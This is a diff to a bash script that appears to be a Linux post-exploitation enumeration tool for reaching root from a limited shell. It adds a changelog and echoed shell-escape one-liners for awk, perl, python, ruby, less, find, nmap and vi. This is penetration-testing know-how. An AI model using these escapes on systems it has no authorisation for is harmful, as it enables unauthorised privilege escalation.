@@ -1,5 +1,17 @@
 #!/bin/bash
-#version 0.2
+# version 0.2
+
+# Postexp tool is a tool to enumerate local informations such as network, system, service, application informations and more, from any Linux box that you find your self you have a limited privilege shell on it.
+# it helps you finding your way to the root privilege.
+
+# Changelogs
+# Version 0.1
+# it's the first time that we release our tool
+
+# Version 0.2
+# A new title - shell escape [./postexp -l]
+# Editing the development tools as well as the way to extract version from applications/services
+
 echo ""
 echo ""
 echo ""
@@ -728,10 +740,14 @@ echo "awk    =	awk 'BEGIN {system(\"/bin/sh\")}'"
 echo "perl   =	perl -e 'exec \"/bin/sh\";'"
 echo "python = 	python -c 'import pty;pty.spawn(\"/bin/sh\")'"
 echo "php    =	php -r 'system(\"/bin/sh\");'"
+echo "ruby   =	ruby -e 'exec \"/bin/sh\"'"
+echo "less   =	!sh"
+echo "more   =	!sh"
 echo "nmap   =	--interactive"
 echo "find   =	find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/sh\")}' \;"
-echo "vi     =	:!sh"
-echo "vim    =	:!sh"
+echo "find   =	find / -exec sh -i \;"
+echo "vi     =	:!sh or :shell"
+echo "vim    =	:!sh or :shell"
 echo ""
 }
 
